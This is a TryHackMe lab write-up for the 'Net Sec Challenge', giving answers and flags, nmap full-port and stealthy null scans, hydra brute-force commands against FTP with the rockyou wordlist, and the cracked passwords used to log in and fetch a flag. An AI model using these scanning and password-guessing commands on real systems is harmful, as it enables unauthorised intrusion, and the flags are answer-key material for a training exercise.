# Net-Sec-Challenge-Writeup
An updated writeup for the net sec challenge lab do try hack me, good studies

# All Questions

![image](https://github.com/user-attachments/assets/3c366a6e-9c18-4c07-899c-346b1d6d24db)

# WriteUp

Use nmap -p- -v -A machine_ip to see all the details needed for the questions 1-6

1. What is the highest port number being open less than 10,000?

R = 8080

![image](https://github.com/user-attachments/assets/b0b1307f-3198-442e-916c-ce39a8ba20f0)

2. There is an open port outside the common 1000 ports; it is above 10,000. What is it?

R=10021

![image](https://github.com/user-attachments/assets/266226b8-a2e5-44d3-8fce-5e9de0d4910f)

3. How many TCP ports are open?

R= 6, just count the ports.

4. What is the flag hidden in the HTTP server header?

R= THM{web_server_25352}

![image](https://github.com/user-attachments/assets/bb62dcb2-0498-47be-b111-a06df5f7f1d7)

5. What is the flag hidden in the SSH server header?

R= THM{946219583339}

![image](https://github.com/user-attachments/assets/4d1a15d4-59e1-4ce7-ba61-3a34bde95865)

6. We have an FTP server listening on a nonstandard port. What is the version of the FTP server?

R= vsftpd 3.0.5

![image](https://github.com/user-attachments/assets/edbb00d1-43ea-4037-8655-a6a81c01709d)

7. We learned two usernames using social engineering: `eddie` and `quinn`. What is the flag hidden in one of these two account files and accessible via FTP?

hydra -l eddie -P /usr/share/wordlists/rockyou.txt ftp://machine_ip:10021

password: jordan

hydra -l quinn -P /usr/share/wordlists/rockyou.txt ftp://machine_ip:10021

password: andrea

![image](https://github.com/user-attachments/assets/902f0a67-e3e4-44cb-bc21-c5563311a160)

$ ftp machine_ip 10021 
user: quinn
password: andrea

connect via ftp

![image](https://github.com/user-attachments/assets/bbd53333-8c6b-41a5-a4e9-5a46678d918f)

ftp> ls
ftp> get ftp_flag.txt
With this we get the flag

![image](https://github.com/user-attachments/assets/9a044d0a-620e-41aa-be51-d255f9a6cccf)

ftp> quit
$ cat ftp_flag.txt

![image](https://github.com/user-attachments/assets/939ea7e5-a1e0-4396-9c68-910e76d13706)

R= THM{321452667098}

8. Browsing to `http://10.10.209.57:8080` displays a small challenge that will give you a flag once you solve it. What is the flag?

![image](https://github.com/user-attachments/assets/e05a9daf-e239-4c15-88fb-0f5926a0aa31)

USE sudo nmap -sN 10.10.209.57

![image](https://github.com/user-attachments/assets/a8e11ffe-0588-437b-8acf-93fd67302ad5)

use null scan for less detection

![image](https://github.com/user-attachments/assets/5ad99a9c-9aaf-4163-b15a-075672777b7f)

R= THM{f7443f99}

Good Learning!
